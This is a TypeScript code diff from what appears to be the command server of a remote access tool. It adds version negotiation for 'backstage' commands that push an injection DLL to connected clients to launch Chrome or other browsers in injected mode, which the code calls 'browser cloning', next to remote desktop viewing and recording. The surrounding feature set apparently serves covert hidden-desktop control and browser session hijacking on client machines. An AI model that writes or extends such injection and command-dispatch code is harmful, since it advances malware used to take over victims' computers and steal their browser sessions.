@@ -5,6 +5,8 @@ import { logger } from "../logger";
 import { negotiateDesktopCodec } from "./desktop-codec-negotiation";
 import { metrics } from "../metrics";
 import { encodeMessage } from "../protocol";
+import { requireCommandVersion, versionCommandForClient } from "../command-compatibility";
+import type { CommandType } from "../generated/wire-contract";
 import { getInjectionDllBytes } from "./backstage-dll-cache";
 import * as sessionManager from "../sessions/sessionManager";
 import type { ConsoleSession, RemoteDesktopViewer, SocketData } from "../sessions/types";
@@ -31,6 +33,19 @@ import {
   startRemoteDesktopRecording,
   stopRemoteDesktopRecording,
 } from "./rd-recording";
+
+function getVersionedInjectionDll(
+  target: ClientInfo | undefined,
+  commandType: CommandType,
+): Uint8Array | null {
+  if (!target) return null;
+  try {
+    return getInjectionDllBytes(requireCommandVersion(target, commandType));
+  } catch (error) {
+    logger.warn(`[backstage] cannot negotiate ${commandType}: ${error instanceof Error ? error.message : String(error)}`);
+    return null;
+  }
+}
 
 const VIEWER_BACKPRESSURE_BYTES = Math.max(
   64 * 1024,
@@ -1343,7 +1358,7 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
       sendbackstageCommand(target, "backstage_kill_all", {});
       break;
     case "backstage_start_process_injected": {
-      const dllData = getInjectionDllBytes();
+      const dllData = getVersionedInjectionDll(target, "backstage_start_process_injected");
       if (!dllData) {
         logger.warn("[backstage] injection DLL not available, cannot send backstage_start_process_injected");
         safeSendViewer(ws, { type: "backstage_error", error: "backstage injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
@@ -1361,7 +1376,7 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
       break;
     }
     case "backstage_start_chrome_injected": {
-      const dllData = getInjectionDllBytes();
+      const dllData = getVersionedInjectionDll(target, "backstage_start_chrome_injected");
       if (!dllData) {
         logger.warn("[backstage] injection DLL not available, cannot send backstage_start_chrome_injected");
         safeSendViewer(ws, { type: "backstage_error", error: "backstage injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
@@ -1377,7 +1392,7 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
       break;
     }
     case "backstage_start_browser_injected": {
-      const dllData = getInjectionDllBytes();
+      const dllData = getVersionedInjectionDll(target, "backstage_start_browser_injected");
       if (!dllData) {
         logger.warn("[backstage] injection DLL not available, cannot send backstage_start_browser_injected");
         safeSendViewer(ws, { type: "backstage_error", error: "backstage injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
@@ -1439,7 +1454,13 @@ export function sendbackstageCommand(target: ClientInfo | undefined, commandType
   }
   try {
     logger.debug(`[backstage] send command command=${commandType} client=${target.id} payload=${JSON.stringify(payload || {})}`);
-    target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, id: uuidv4(), payload }));
+    const command = versionCommandForClient(target, {
+      type: "command",
+      commandType: commandType as CommandType,
+      id: uuidv4(),
+      payload,
+    });
+    target.ws.send(encodeMessage(command));
     metrics.recordCommand(commandType);
     return true;
   } catch (err) {
